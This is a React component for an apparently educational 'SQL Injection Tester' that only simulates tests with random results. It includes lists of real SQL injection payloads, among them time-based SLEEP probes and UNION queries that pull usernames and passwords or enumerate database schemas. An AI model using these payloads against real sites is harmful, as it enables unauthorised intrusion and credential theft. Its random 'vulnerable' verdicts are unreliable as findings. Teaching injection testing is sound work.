import React, { useState, useEffect } from 'react';
import { useTerminal } from '@/hooks/use-terminal';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { AlertCircle, Play, Database, Shield, ExternalLink, Code } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { cn } from '@/lib/utils';

interface SqlInjectorProps {
  onInjectionTest?: (result: any) => void;
}

interface InjectionResult {
  status: 'success' | 'failed' | 'error';
  message: string;
  details?: string;
  vulnerable: boolean;
  injectionType?: string;
  payload?: string;
  response?: string;
}

export default function SqlInjector({ onInjectionTest }: SqlInjectorProps) {
  const [target, setTarget] = useState<string>('');
  const [parameter, setParameter] = useState<string>('');
  const [method, setMethod] = useState<string>('GET');
  const [testType, setTestType] = useState<string>('error');
  const [customPayload, setCustomPayload] = useState<string>('');
  const [isTesting, setIsTesting] = useState<boolean>(false);
  const [injectionResults, setInjectionResults] = useState<InjectionResult[]>([]);
  const [error, setError] = useState<string | null>(null);
  
  const { addSystemLine, addInfoLine, addErrorLine, addCommandLine, addLine } = useTerminal();
  const { toast } = useToast();
  
  // Common SQL injection payloads
  const errorPayloads = [
    `' OR 1=1 --`,
    `" OR 1=1 --`,
    `' OR '1'='1`,
    `" OR "1"="1`,
    `') OR ('1'='1`,
    `1' OR '1' = '1`,
    `1 OR 1=1`,
    `' OR 'x'='x`,
    `' OR 1=1 OR ''='`,
    `' OR 1=1/*`,
    `' OR 1=1#`,
    `' OR 1=1;--`,
  ];
  
  const blindPayloads = [
    `' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --`,
    `' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1`,
    `'; WAITFOR DELAY '0:0:5' --`,
    `'; BEGIN DBMS_LOCK.SLEEP(5); END; --`,
    `'; SELECT pg_sleep(5) --`,
    `'; SELECT SLEEP(5) --`,
  ];
  
  const unionPayloads = [
    `' UNION SELECT 1,2,3 --`,
    `' UNION SELECT 1,2,3,4 --`,
    `' UNION SELECT 1,2,3,4,5 --`,
    `' UNION ALL SELECT 1,2,3,4,5 --`,
    `' UNION SELECT NULL,NULL,NULL --`,
    `' UNION SELECT username,password,3 FROM users --`,
    `' UNION SELECT table_name,2,3 FROM information_schema.tables --`,
    `' UNION SELECT column_name,2,3 FROM information_schema.columns --`,
  ];
  
  const testDescriptions = {
    error: "Error-based techniques attempt to trigger database errors that may reveal information about the database structure or confirm injection vulnerabilities.",
    blind: "Blind/time-based techniques don't produce visible errors but can be detected by timing differences in responses or conditional behaviors.",
    union: "UNION-based attacks attempt to combine the original query with another SELECT statement to retrieve data from different database tables."
  };

  // Effect to clear errors when inputs change
  useEffect(() => {
    setError(null);
  }, [target, parameter, method, testType]);
  
  const runTest = async () => {
    if (!target) {
      setError('Target URL is required');
      addErrorLine('Target URL is required');
      return;
    }
    
    if (!parameter) {
      setError('Parameter name is required');
      addErrorLine('Parameter name is required');
      return;
    }
    
    setIsTesting(true);
    setError(null);
    const results: InjectionResult[] = [];
    
    // Get payloads based on selected test type
    let payloads = [];
    let injectionType = '';
    
    switch (testType) {
      case 'error':
        payloads = errorPayloads;
        injectionType = 'Error-based';
        break;
      case 'blind':
        payloads = blindPayloads;
        injectionType = 'Blind/Time-based';
        break;
      case 'union':
        payloads = unionPayloads;
        injectionType = 'UNION-based';
        break;
      case 'custom':
        payloads = [customPayload];
        injectionType = 'Custom';
        break;
      default:
        payloads = errorPayloads;
        injectionType = 'Error-based';
    }
    
    addCommandLine(`sqlinjection-test --target ${target} --param ${parameter} --method ${method} --type ${testType}`);
    addInfoLine(`Starting SQL injection test on ${target}`);
    addInfoLine(`Testing parameter: ${parameter} using ${injectionType} technique`);
    
    // This is a simulated test for educational purposes only
    // In a real tool, this would make actual HTTP requests to test the target
    // But for educational purposes, we're just simulating responses
    
    for (let i = 0; i < payloads.length; i++) {
      if (i < 3) { // Only simulate testing the first few payloads for demo purposes
        const payload = payloads[i];
        
        // Add some delay to simulate the test running
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        addLine(`Testing payload: ${payload}`, "command");
        
        // Generate a simulated result (random for demonstration)
        const isVulnerable = Math.random() > 0.7;
        const result: InjectionResult = {
          status: isVulnerable ? 'success' : 'failed',
          message: isVulnerable ? 'Potential SQL injection vulnerability detected' : 'No vulnerability detected',
          vulnerable: isVulnerable,
          injectionType: injectionType,
          payload: payload,
          response: isVulnerable 
            ? 'Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...' 
            : 'No suspicious response detected'
        };
        
        results.push(result);
        
        if (isVulnerable) {
          addLine(`[VULNERABILITY] Possible SQL injection point found with payload: ${payload}`, "error");
        } else {
          addLine(`[SECURE] No vulnerability detected with payload: ${payload}`, "info");
        }
      }
    }
    
    // Final report
    const vulnerableCount = results.filter(r => r.vulnerable).length;
    
    if (vulnerableCount > 0) {
      addLine(`[WARNING] ${vulnerableCount} potential SQL injection vulnerabilities found`, "error");
    } else {
      addLine(`[SECURE] No SQL injection vulnerabilities detected in tested parameters`, "success");
    }
    
    setInjectionResults(results);
    setIsTesting(false);
    
    if (onInjectionTest) {
      onInjectionTest({
        target,
        parameter,
        method,
        testType,
        results,
        timestamp: new Date(),
        summary: {
          total: payloads.length < 4 ? payloads.length : 3, // Only the ones we actually tested
          vulnerable: vulnerableCount
        }
      });
    }
  };
  
  const handleClearResults = () => {
    setInjectionResults([]);
    addInfoLine("SQL injection test results cleared");
  };
  
  return (
    <div className="space-y-6">
      <Card className="p-4 border-primary/30 bg-card">
        <h2 className="text-xl font-tech text-primary mb-4">SQL Injection Tester</h2>
        
        <div className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="target-url" className="text-sm font-tech">
              Target URL
            </Label>
            <Input
              id="target-url"
              placeholder="https://example.com/page.php"
              value={target}
              onChange={(e) => setTarget(e.target.value)}
              className="font-mono"
            />
            <p className="text-xs font-mono text-muted-foreground mt-1">
              Enter the full URL of the page to test, including http:// or https://
            </p>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label htmlFor="parameter" className="text-sm font-tech">
                Parameter to Test
              </Label>
              <Input
                id="parameter"
                placeholder="id"
                value={parameter}
                onChange={(e) => setParameter(e.target.value)}
                className="font-mono"
              />
              <p className="text-xs font-mono text-muted-foreground mt-1">
                The query parameter to test (e.g., "id" for "?id=1")
              </p>
            </div>
            
            <div className="space-y-2">
              <Label htmlFor="method" className="text-sm font-tech">
                Request Method
              </Label>
              <Select defaultValue={method} onValueChange={setMethod}>
                <SelectTrigger id="method" className="font-mono">
                  <SelectValue placeholder="Select method" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="GET">GET</SelectItem>
                  <SelectItem value="POST">POST</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>
          
          <div className="space-y-2">
            <Label className="text-sm font-tech">
              Injection Technique
            </Label>
            <Tabs defaultValue="error" onValueChange={setTestType} className="w-full">
              <TabsList className="grid grid-cols-4 mb-2">
                <TabsTrigger value="error" className="text-xs font-mono">Error-based</TabsTrigger>
                <TabsTrigger value="blind" className="text-xs font-mono">Time-based</TabsTrigger>
                <TabsTrigger value="union" className="text-xs font-mono">UNION-based</TabsTrigger>
                <TabsTrigger value="custom" className="text-xs font-mono">Custom</TabsTrigger>
              </TabsList>
              
              <TabsContent value="error" className="border border-border rounded-md p-3">
                <p className="text-xs font-mono text-muted-foreground mb-2">
                  {testDescriptions.error}
                </p>
                <div className="bg-background/50 p-2 rounded text-xs font-mono">
                  {errorPayloads[0]}
                </div>
              </TabsContent>
              
              <TabsContent value="blind" className="border border-border rounded-md p-3">
                <p className="text-xs font-mono text-muted-foreground mb-2">
                  {testDescriptions.blind}
                </p>
                <div className="bg-background/50 p-2 rounded text-xs font-mono">
                  {blindPayloads[0]}
                </div>
              </TabsContent>
              
              <TabsContent value="union" className="border border-border rounded-md p-3">
                <p className="text-xs font-mono text-muted-foreground mb-2">
                  {testDescriptions.union}
                </p>
                <div className="bg-background/50 p-2 rounded text-xs font-mono">
                  {unionPayloads[0]}
                </div>
              </TabsContent>
              
              <TabsContent value="custom" className="border border-border rounded-md p-3">
                <div className="space-y-2">
                  <Label htmlFor="custom-payload" className="text-xs font-tech">
                    Custom Payload
                  </Label>
                  <Textarea
                    id="custom-payload"
                    placeholder="Enter your custom SQL injection payload"
                    value={customPayload}
                    onChange={(e) => setCustomPayload(e.target.value)}
                    className="font-mono text-xs h-20"
                  />
                </div>
              </TabsContent>
            </Tabs>
          </div>
          
          {error && (
            <div className="bg-destructive/10 p-3 rounded-md border border-destructive/50 text-destructive flex items-start gap-2 text-sm font-mono">
              <AlertCircle className="h-4 w-4 mt-0.5" />
              <span>{error}</span>
            </div>
          )}
          
          <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-3">
            <Button
              onClick={runTest}
              disabled={isTesting}
              className="bg-primary text-primary-foreground hover:bg-primary/90 font-tech"
            >
              {isTesting ? (
                <>Testing... <Play className="h-4 w-4 ml-2 animate-pulse" /></>
              ) : (
                <>Run Test <Play className="h-4 w-4 ml-2" /></>
              )}
            </Button>
            
            {injectionResults.length > 0 && (
              <Button
                onClick={handleClearResults}
                variant="outline"
                disabled={isTesting}
                className="border-secondary/50 text-secondary font-tech"
              >
                Clear Results
              </Button>
            )}
          </div>
        </div>
      </Card>
      
      {injectionResults.length > 0 && (
        <Card className="p-4 border-secondary/30 bg-card">
          <h2 className="text-lg font-tech text-secondary mb-4">Test Results</h2>
          
          <div className="space-y-4">
            <div className="grid grid-cols-2 gap-4 mb-4">
              <div className="bg-background p-3 rounded-md border border-border">
                <div className="text-xs font-mono text-muted-foreground">Target URL</div>
                <div className="font-mono text-sm mt-1 break-all">{target}</div>
              </div>
              <div className="bg-background p-3 rounded-md border border-border">
                <div className="text-xs font-mono text-muted-foreground">Parameter Tested</div>
                <div className="font-mono text-sm mt-1">{parameter} ({method})</div>
              </div>
            </div>
            
            <div className="border border-border rounded-md overflow-hidden">
              <div className="bg-muted p-2 grid grid-cols-12 gap-2 font-tech text-xs border-b border-border">
                <div className="col-span-2">Status</div>
                <div className="col-span-3">Type</div>
                <div className="col-span-3">Payload</div>
                <div className="col-span-4">Response</div>
              </div>
              
              <div className="max-h-64 overflow-y-auto">
                {injectionResults.map((result, index) => (
                  <div 
                    key={index}
                    className={cn(
                      "p-2 grid grid-cols-12 gap-2 font-mono text-xs",
                      index % 2 === 0 ? "bg-background" : "bg-muted",
                      result.vulnerable ? "border-l-2 border-l-destructive" : ""
                    )}
                  >
                    <div className={cn(
                      "col-span-2",
                      result.vulnerable ? "text-destructive" : "text-green-500"
                    )}>
                      {result.vulnerable ? 'VULNERABLE' : 'SECURE'}
                    </div>
                    <div className="col-span-3 text-primary">
                      {result.injectionType}
                    </div>
                    <div className="col-span-3 break-all">
                      {result.payload}
                    </div>
                    <div className="col-span-4 break-all text-xs text-muted-foreground">
                      {result.response}
                    </div>
                  </div>
                ))}
              </div>
            </div>
            
            <div className="p-3 border border-border rounded-md bg-background/50">
              <h3 className="text-sm font-tech mb-2">Educational Notes</h3>
              <p className="text-xs font-mono text-muted-foreground mb-2">
                SQL injection is a code injection technique used to attack data-driven applications by inserting malicious SQL statements into entry fields. 
                This tool is for educational purposes only and simulates the process of testing for SQL injection vulnerabilities.
              </p>
              <div className="flex items-center mt-3">
                <Shield className="h-4 w-4 text-primary mr-2" />
                <span className="text-xs font-mono text-primary">
                  Never test sites without explicit permission from the owner.
                </span>
              </div>
            </div>
          </div>
        </Card>
      )}
    </div>
  );
}